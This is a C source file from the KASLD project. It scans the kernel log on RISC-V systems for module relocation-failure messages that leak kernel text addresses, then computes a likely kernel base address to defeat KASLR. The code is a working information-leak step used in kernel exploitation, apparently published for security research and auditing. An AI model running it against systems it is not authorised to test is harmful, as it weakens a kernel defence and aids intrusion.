// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for RISC-V address relocation failures.
//
// From arch/riscv/kernel/module.c:
//
// "%s: target %016llx can not be addressed by the 32-bit offset from PC = %p\n"
// "%s: can not generate the GOT entry for symbol = %016llx from PC = %p\n"
//
// clang-format off
// $ dmesg | grep ffffe0
// [    0.000000]       lowmem : 0xffffffe000000000 - 0xffffffe07fe00000   (2046 MB)
// [   90.803776] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 000000007c954634
// [   91.659399] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 0000000022acd662
// [   92.516203] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 0000000022acd662
// [   93.452368] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 0000000022acd662
// [   97.393958] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 00000000ca60ae01
// ...
// clang-format on
//
// # grep ffffffe0000dbc18 /proc/kallsyms
// ffffffe0000dbc18 t trace_initcall_finish_cb
// ffffffe0000dbc18 T _stext
// ffffffe0000dbc18 T _text
// ffffffe0000dbc18 D __init_end
// ffffffe0000dbc18 D __per_cpu_end
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.7/source/arch/riscv/kernel/module.c
// https://github.com/riscv-non-isa/riscv-asm-manual/blob/master/riscv-asm.md#assembler-relocation-functions
// ---
// <bcoles@gmail.com>

#if !defined(__riscv) && !defined(__riscv__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const char *needle = ": target ";

static int on_match(const char *line, void *ctx) {
  unsigned long *lowest = ctx;
  char *endptr;

  const char *p = strstr(line, needle);
  if (!p)
    return 1;

  unsigned long addr = strtoul(p + strlen(needle), &endptr, 16);

  if (addr && addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
    if (!*lowest || addr < *lowest)
      *lowest = addr;
  }

  return 1; /* keep scanning for lowest */
}

int main(void) {
  unsigned long addr = 0;

  printf("[.] searching dmesg for RISC-V address relocation failures ...\n");
  dmesg_search(": target ", on_match, &addr);

  if (!addr)
    return 1;

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               "dmesg_riscv_relocation");
  return 0;
}
